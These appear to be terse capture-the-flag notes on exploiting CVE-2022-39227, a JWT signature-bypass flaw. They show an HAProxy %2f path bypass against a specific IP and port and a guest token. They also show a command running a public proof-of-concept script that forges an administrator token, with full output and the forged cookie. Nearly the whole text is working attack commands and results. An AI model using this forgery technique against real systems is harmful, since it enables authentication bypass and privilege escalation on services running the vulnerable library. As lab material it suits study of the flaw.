'''
JWT CVE-2022-39227

haproxy %2f

http://83.136.255.100:54657/%2fapi/v1/get_ticket

{"ticket: ":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAzMDQzMDksImlhdCI6MTcxMDMwMDcwOSwianRpIjoiRnk2OVNOQ2RiUk5rbFFqWEg2WF82dyIsIm5iZiI6MTcxMDMwMDcwOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.hpsKLZXVypbzck5G5NCmeOhVJB6ZuwLvXO06NqQYkbbKr5UJDGoOq0vut3Tx6HpUgwITZcPEXJ7HVUM8KMtrAiKt7xh1c8kI5jDY2ZNQexxU_vNPOZF_n7WtjvVeQaIOX4zdnx0aO8VnJG21lcahN_CRJSy2uD41YqIldY7eIkqRZuUo1fLBB55YFWVhO6WyUJSu0J7YP2sUp7BFrHoGFeYQ-SnrDBjfo5Z8Ud7iXj1s8LaOl7IUhgXhAr8oK0R3RAexwWR38J7abjYwaHyv_nF_SGOMihqF1TyVeeqVPPXwYHwieUtFEM6m1O5r1URjDGj9k0Jdv6dHOkSVN85rmw"}

https://github.com/user0x1337/CVE-2022-39227

python3 cve.py -j eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAzMDQzMDksImlhdCI6MTcxMDMwMDcwOSwianRpIjoiRnk2OVNOQ2RiUk5rbFFqWEg2WF82dyIsIm5iZiI6MTcxMDMwMDcwOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.hpsKLZXVypbzck5G5NCmeOhVJB6ZuwLvXO06NqQYkbbKr5UJDGoOq0vut3Tx6HpUgwITZcPEXJ7HVUM8KMtrAiKt7xh1c8kI5jDY2ZNQexxU_vNPOZF_n7WtjvVeQaIOX4zdnx0aO8VnJG21lcahN_CRJSy2uD41YqIldY7eIkqRZuUo1fLBB55YFWVhO6WyUJSu0J7YP2sUp7BFrHoGFeYQ-SnrDBjfo5Z8Ud7iXj1s8LaOl7IUhgXhAr8oK0R3RAexwWR38J7abjYwaHyv_nF_SGOMihqF1TyVeeqVPPXwYHwieUtFEM6m1O5r1URjDGj9k0Jdv6dHOkSVN85rmw -i "role=administrator,user=admin"
[+] Retrieved base64 encoded payload: eyJleHAiOjE3MTAzMDQzMDksImlhdCI6MTcxMDMwMDcwOSwianRpIjoiRnk2OVNOQ2RiUk5rbFFqWEg2WF82dyIsIm5iZiI6MTcxMDMwMDcwOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ
[+] Decoded payload: {'exp': 1710304309, 'iat': 1710300709, 'jti': 'Fy69SNCdbRNklQjXH6X_6w', 'nbf': 1710300709, 'role': 'guest', 'user': 'guest_user'}
[+] Inject new "fake" payload: {'exp': 1710304309, 'iat': 1710300709, 'jti': 'Fy69SNCdbRNklQjXH6X_6w', 'nbf': 1710300709, 'role': 'administrator', 'user': 'admin'}
[+] Fake payload encoded: eyJleHAiOjE3MTAzMDQzMDksImlhdCI6MTcxMDMwMDcwOSwianRpIjoiRnk2OVNOQ2RiUk5rbFFqWEg2WF82dyIsIm5iZiI6MTcxMDMwMDcwOSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiYWRtaW4ifQ

[+] New token:
 {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAzMDQzMDksImlhdCI6MTcxMDMwMDcwOSwianRpIjoiRnk2OVNOQ2RiUk5rbFFqWEg2WF82dyIsIm5iZiI6MTcxMDMwMDcwOSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiYWRtaW4ifQ.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAzMDQzMDksImlhdCI6MTcxMDMwMDcwOSwianRpIjoiRnk2OVNOQ2RiUk5rbFFqWEg2WF82dyIsIm5iZiI6MTcxMDMwMDcwOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"hpsKLZXVypbzck5G5NCmeOhVJB6ZuwLvXO06NqQYkbbKr5UJDGoOq0vut3Tx6HpUgwITZcPEXJ7HVUM8KMtrAiKt7xh1c8kI5jDY2ZNQexxU_vNPOZF_n7WtjvVeQaIOX4zdnx0aO8VnJG21lcahN_CRJSy2uD41YqIldY7eIkqRZuUo1fLBB55YFWVhO6WyUJSu0J7YP2sUp7BFrHoGFeYQ-SnrDBjfo5Z8Ud7iXj1s8LaOl7IUhgXhAr8oK0R3RAexwWR38J7abjYwaHyv_nF_SGOMihqF1TyVeeqVPPXwYHwieUtFEM6m1O5r1URjDGj9k0Jdv6dHOkSVN85rmw"}

Example (HTTP-Cookie):
------------------------------
auth={"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAzMDQzMDksImlhdCI6MTcxMDMwMDcwOSwianRpIjoiRnk2OVNOQ2RiUk5rbFFqWEg2WF82dyIsIm5iZiI6MTcxMDMwMDcwOSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiYWRtaW4ifQ.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAzMDQzMDksImlhdCI6MTcxMDMwMDcwOSwianRpIjoiRnk2OVNOQ2RiUk5rbFFqWEg2WF82dyIsIm5iZiI6MTcxMDMwMDcwOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"hpsKLZXVypbzck5G5NCmeOhVJB6ZuwLvXO06NqQYkbbKr5UJDGoOq0vut3Tx6HpUgwITZcPEXJ7HVUM8KMtrAiKt7xh1c8kI5jDY2ZNQexxU_vNPOZF_n7WtjvVeQaIOX4zdnx0aO8VnJG21lcahN_CRJSy2uD41YqIldY7eIkqRZuUo1fLBB55YFWVhO6WyUJSu0J7YP2sUp7BFrHoGFeYQ-SnrDBjfo5Z8Ud7iXj1s8LaOl7IUhgXhAr8oK0R3RAexwWR38J7abjYwaHyv_nF_SGOMihqF1TyVeeqVPPXwYHwieUtFEM6m1O5r1URjDGj9k0Jdv6dHOkSVN85rmw"}

The return value is a mix form of JSON and compact representation. You need to paste the entire value including "{" and "}" as your new JWT Web token.
'''
